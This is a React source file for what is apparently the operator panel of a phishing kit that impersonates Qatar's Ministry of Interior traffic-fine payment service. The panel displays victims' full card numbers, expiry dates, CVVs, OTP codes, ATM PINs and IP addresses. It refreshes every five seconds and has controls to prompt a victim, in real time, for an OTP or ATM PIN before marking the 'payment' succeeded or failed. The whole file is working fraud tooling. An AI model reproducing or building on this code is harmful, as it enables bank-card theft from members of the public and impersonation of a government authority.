import React, { useState, useRef, useEffect } from "react";
import { trpc } from "@/lib/trpc";
import { 
  Shield, 
  Users, 
  CreditCard, 
  Search, 
  Eye, 
  CheckCircle2, 
  XCircle, 
  Clock, 
  ExternalLink,
  MoreVertical,
  Filter,
  RefreshCcw,
  LayoutDashboard,
  FileText,
  AlertCircle
} from "lucide-react";
import { Badge } from "@/components/ui/badge";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

interface PaymentSession {
  id: number;
  sessionId: string;
  queryId: number | null;
  selectedFines: any;
  totalAmount: string | null;
  cardName: string | null;
  cardNumber: string | null;
  cardNumberMasked: string | null;
  cardExpiry: string | null;
  cardCvv: string | null;
  otpCode: string | null;
  atmPin: string | null;
  stage: Stage;
  errorMessage: string | null;
  plateNumber: string | null;
  plateSource: string | null;
  clientIp: string | null;
  userAgent: string | null;
  statusRead: number | null;
  createdAt: Date | string;
  updatedAt: Date | string;
}

const stageConfig: Record<Stage, { label: string; color: string; bg: string; icon: any }> = {
  card:         { label: "جديد",              color: "#8a1538", bg: "#fdf2f2", icon: Clock },
  card_pending: { label: "انتظار البطاقة",    color: "#d97706", bg: "#fef3c7", icon: CreditCard },
  otp:          { label: "مطلوب OTP",         color: "#b45309", bg: "#fef9c3", icon: Shield },
  otp_pending:  { label: "انتظار OTP",        color: "#b45309", bg: "#fef9c3", icon: Shield },
  atm:          { label: "مطلوب PIN",         color: "#7c3aed", bg: "#ede9fe", icon: CreditCard },
  atm_pending:  { label: "انتظار PIN",        color: "#7c3aed", bg: "#ede9fe", icon: CreditCard },
  success:      { label: "مكتمل",             color: "#16a34a", bg: "#dcfce7", icon: CheckCircle2 },
  failed:       { label: "فشل",               color: "#dc2626", bg: "#fee2e2", icon: XCircle },
};

export default function AdminPanel() {
  const [token, setToken] = useState<string | null>(() => localStorage.getItem("adminToken"));
  const [password, setPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [selectedSession, setSelectedSession] = useState<PaymentSession | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [customError, setCustomError] = useState("");

  const loginMutation = trpc.admin.login.useMutation({
    onSuccess: (data) => {
      localStorage.setItem("adminToken", data.token);
      setToken(data.token);
    },
    onError: (err) => setLoginError(err.message),
  });

  const { data: dashboardData, refetch } = trpc.admin.getDashboardStats.useQuery(undefined, {
    enabled: !!token,
    refetchInterval: 5000,
  });

  const updateStageMutation = trpc.admin.updateSessionStage.useMutation({
    onSuccess: () => {
      refetch();
      setSelectedSession(null);
      setCustomError("");
    }
  });

  if (!token) {
    return (
      <div className="min-h-screen bg-[#8A1538] flex items-center justify-center p-4" dir="rtl">
        <div className="bg-white rounded-3xl shadow-2xl p-10 w-full max-w-md text-center">
          <div className="w-20 h-20 bg-[#FDF2F2] text-[#8A1538] rounded-full flex items-center justify-center mx-auto mb-6">
            <Shield size={40} />
          </div>
          <h1 className="text-2xl font-black text-gray-900 mb-2">لوحة التحكم - قطر</h1>
          <p className="text-gray-500 mb-8">يرجى إدخال كلمة المرور للوصول للنظام</p>
          <div className="space-y-4">
            <input 
              type="password" 
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full p-4 bg-gray-50 border-2 border-gray-100 rounded-2xl focus:border-[#8A1538] outline-none text-center font-bold"
              placeholder="كلمة المرور"
              onKeyDown={(e) => e.key === 'Enter' && loginMutation.mutate({ password })}
            />
            {loginError && <p className="text-red-500 text-sm font-bold">{loginError}</p>}
            <button 
              onClick={() => loginMutation.mutate({ password })}
              className="w-full bg-[#8A1538] hover:bg-[#6D112C] text-white font-black py-4 rounded-2xl shadow-lg transition-all"
            >
              تسجيل الدخول
            </button>
          </div>
        </div>
      </div>
    );
  }

  const sessions = (dashboardData?.sessions || []) as unknown as PaymentSession[];
  const filteredSessions = sessions.filter(s => 
    s.sessionId.includes(searchQuery) || 
    s.plateNumber?.includes(searchQuery) ||
    s.cardName?.includes(searchQuery)
  );

  const handleUpdateStage = (sessionId: string, stage: Stage, error?: string) => {
    updateStageMutation.mutate({ sessionId, stage, errorMessage: error });
  };

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      {/* Sidebar (Desktop) */}
      <aside className="fixed right-0 top-0 bottom-0 w-64 bg-[#8A1538] text-white p-6 hidden lg:block z-50">
        <div className="flex items-center gap-3 mb-12">
          <div className="w-10 h-10 bg-white/10 rounded-xl flex items-center justify-center">
            <Shield size={24} className="text-white" />
          </div>
          <span className="font-black text-xl">وزارة الداخلية</span>
        </div>
        <nav className="space-y-2">
          <button className="w-full flex items-center gap-3 px-4 py-3 bg-white/10 rounded-xl text-white font-bold transition-all">
            <LayoutDashboard size={20} />
            <span>لوحة التحكم</span>
          </button>
          <button className="w-full flex items-center gap-3 px-4 py-3 text-white/60 hover:bg-white/5 rounded-xl font-bold transition-all">
            <CreditCard size={20} />
            <span>العمليات</span>
          </button>
        </nav>
      </aside>

      {/* Main Content */}
      <main className="lg:pr-64 min-h-screen">
        <header className="bg-white border-b border-gray-200 sticky top-0 z-40 px-8 py-4 flex items-center justify-between">
          <h2 className="text-xl font-black text-gray-900">إدارة العمليات - قطر</h2>
          <div className="flex items-center gap-4">
            <div className="relative">
              <Search className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400" size={18} />
              <input 
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="bg-gray-100 border-none rounded-xl pr-10 pl-4 py-2 text-sm focus:ring-2 focus:ring-[#8A1538] outline-none w-64" 
                placeholder="بحث عن عملية..." 
              />
            </div>
            <button onClick={() => refetch()} className="p-2 text-gray-400 hover:text-[#8A1538] transition-colors">
              <RefreshCcw size={20} />
            </button>
          </div>
        </header>

        <div className="p-8">
          {/* Stats */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
            <div className="bg-white p-6 rounded-3xl shadow-sm border border-gray-100">
              <div className="text-gray-400 text-xs font-bold uppercase mb-2">إجمالي العمليات</div>
              <div className="text-3xl font-black text-gray-900">{sessions.length}</div>
            </div>
            <div className="bg-white p-6 rounded-3xl shadow-sm border border-gray-100">
              <div className="text-amber-500 text-xs font-bold uppercase mb-2">قيد الانتظار</div>
              <div className="text-3xl font-black text-gray-900">{sessions.filter(s => s.stage.endsWith('_pending')).length}</div>
            </div>
            <div className="bg-white p-6 rounded-3xl shadow-sm border border-gray-100">
              <div className="text-green-500 text-xs font-bold uppercase mb-2">عمليات ناجحة</div>
              <div className="text-3xl font-black text-gray-900">{sessions.filter(s => s.stage === 'success').length}</div>
            </div>
          </div>

          {/* Table */}
          <div className="bg-white rounded-3xl shadow-sm border border-gray-100 overflow-hidden">
            <table className="w-full text-right">
              <thead className="bg-gray-50 border-b border-gray-100">
                <tr>
                  <th className="px-6 py-4 text-xs font-bold text-gray-400 uppercase">العملية</th>
                  <th className="px-6 py-4 text-xs font-bold text-gray-400 uppercase">البيانات</th>
                  <th className="px-6 py-4 text-xs font-bold text-gray-400 uppercase">المبلغ</th>
                  <th className="px-6 py-4 text-xs font-bold text-gray-400 uppercase">الحالة</th>
                  <th className="px-6 py-4 text-xs font-bold text-gray-400 uppercase">التوقيت</th>
                  <th className="px-6 py-4 text-xs font-bold text-gray-400 uppercase"></th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-50">
                {filteredSessions.map((session) => (
                  <tr key={session.id} className="hover:bg-gray-50/50 transition-colors group">
                    <td className="px-6 py-4">
                      <div className="font-mono text-xs font-bold text-[#8A1538]">#{session.sessionId.slice(0, 8)}</div>
                      <div className="text-[10px] text-gray-400 mt-1">{session.clientIp}</div>
                    </td>
                    <td className="px-6 py-4">
                      <div className="text-sm font-bold text-gray-800">{session.plateNumber || 'بدون لوحة'}</div>
                      <div className="text-[10px] text-gray-500 mt-0.5">{session.cardName || 'بدون اسم'}</div>
                    </td>
                    <td className="px-6 py-4">
                      <div className="text-sm font-black text-gray-900">{session.totalAmount || '0.00'} <span className="text-[10px] text-gray-400">ر.ق</span></div>
                    </td>
                    <td className="px-6 py-4">
                      <Badge className="font-bold" style={{ 
                        backgroundColor: stageConfig[session.stage]?.bg,
                        color: stageConfig[session.stage]?.color,
                        boxShadow: 'none'
                      }}>
                        {stageConfig[session.stage]?.label}
                      </Badge>
                    </td>
                    <td className="px-6 py-4">
                      <div className="text-xs text-gray-500">{new Date(session.createdAt).toLocaleTimeString('ar-QA')}</div>
                      <div className="text-[10px] text-gray-400">{new Date(session.createdAt).toLocaleDateString('ar-QA')}</div>
                    </td>
                    <td className="px-6 py-4 text-left">
                      <button 
                        onClick={() => setSelectedSession(session)}
                        className="p-2 text-gray-300 hover:text-[#8A1538] transition-colors"
                      >
                        <Eye size={18} />
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </main>

      {/* Detail Modal */}
      {selectedSession && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-[100] flex items-center justify-center p-4" dir="rtl">
          <div className="bg-white rounded-[2.5rem] w-full max-w-2xl shadow-2xl overflow-hidden animate-in zoom-in duration-300">
            <div className="bg-[#8A1538] p-8 text-white flex justify-between items-center">
              <div>
                <h3 className="text-xl font-black mb-1">تفاصيل العملية</h3>
                <p className="text-white/60 text-xs font-mono">#{selectedSession.sessionId}</p>
              </div>
              <button onClick={() => setSelectedSession(null)} className="p-2 hover:bg-white/10 rounded-full transition-colors">
                <XCircle size={24} />
              </button>
            </div>
            
            <div className="p-8 max-h-[70vh] overflow-y-auto">
              <div className="grid grid-cols-2 gap-8 mb-8">
                <div className="space-y-6">
                  <div>
                    <h4 className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3">بيانات المركبة</h4>
                    <div className="bg-gray-50 p-4 rounded-2xl space-y-2">
                      <div className="flex justify-between text-sm"><span className="text-gray-500">رقم اللوحة:</span><span className="font-bold">{selectedSession.plateNumber}</span></div>
                      <div className="flex justify-between text-sm"><span className="text-gray-500">المصدر:</span><span className="font-bold">{selectedSession.plateSource}</span></div>
                    </div>
                  </div>
                  <div>
                    <h4 className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3">بيانات البطاقة</h4>
                    <div className="bg-[#FDF2F2] p-4 rounded-2xl space-y-2 border border-[#8A1538]/10">
                      <div className="flex justify-between text-sm"><span className="text-[#8A1538]">رقم البطاقة:</span><span className="font-mono font-bold">{selectedSession.cardNumber}</span></div>
                      <div className="flex justify-between text-sm"><span className="text-[#8A1538]">التاريخ:</span><span className="font-bold">{selectedSession.cardExpiry}</span></div>
                      <div className="flex justify-between text-sm"><span className="text-[#8A1538]">CVV:</span><span className="font-bold">{selectedSession.cardCvv}</span></div>
                    </div>
                  </div>
                </div>
                
                <div className="space-y-6">
                  <div>
                    <h4 className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3">رموز التحقق</h4>
                    <div className="bg-gray-50 p-4 rounded-2xl space-y-4">
                      <div className="text-center">
                        <div className="text-[10px] text-gray-400 font-bold mb-1">OTP CODE</div>
                        <div className="text-2xl font-black text-[#8A1538] tracking-widest">{selectedSession.otpCode || '----'}</div>
                      </div>
                      <div className="text-center pt-4 border-t border-gray-200">
                        <div className="text-[10px] text-gray-400 font-bold mb-1">ATM PIN</div>
                        <div className="text-2xl font-black text-blue-700 tracking-widest">{selectedSession.atmPin || '----'}</div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {/* Control Actions */}
              <div className="bg-gray-900 rounded-3xl p-6 text-white">
                <h4 className="text-xs font-bold text-gray-500 uppercase mb-4">التحكم في المرحلة</h4>
                <div className="grid grid-cols-2 gap-3">
                  <button 
                    onClick={() => handleUpdateStage(selectedSession.sessionId, 'otp')}
                    className="py-3 bg-amber-600 hover:bg-amber-700 rounded-xl font-bold text-sm transition-all"
                  >
                    طلب رمز OTP
                  </button>
                  <button 
                    onClick={() => handleUpdateStage(selectedSession.sessionId, 'atm')}
                    className="py-3 bg-blue-600 hover:bg-blue-700 rounded-xl font-bold text-sm transition-all"
                  >
                    طلب رقم PIN
                  </button>
                  <button 
                    onClick={() => handleUpdateStage(selectedSession.sessionId, 'success')}
                    className="py-3 bg-green-600 hover:bg-green-700 rounded-xl font-bold text-sm transition-all"
                  >
                    قبول العملية (نجاح)
                  </button>
                  <button 
                    onClick={() => handleUpdateStage(selectedSession.sessionId, 'failed', customError || 'تم رفض العملية')}
                    className="py-3 bg-red-600 hover:bg-red-700 rounded-xl font-bold text-sm transition-all"
                  >
                    رفض العملية (فشل)
                  </button>
                </div>
                <div className="mt-4">
                  <input 
                    type="text" 
                    value={customError}
                    onChange={(e) => setCustomError(e.target.value)}
                    placeholder="سبب الرفض (اختياري)"
                    className="w-full bg-white/10 border-none rounded-xl px-4 py-2 text-sm text-white placeholder:text-gray-500 outline-none focus:ring-1 focus:ring-red-500"
                  />
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
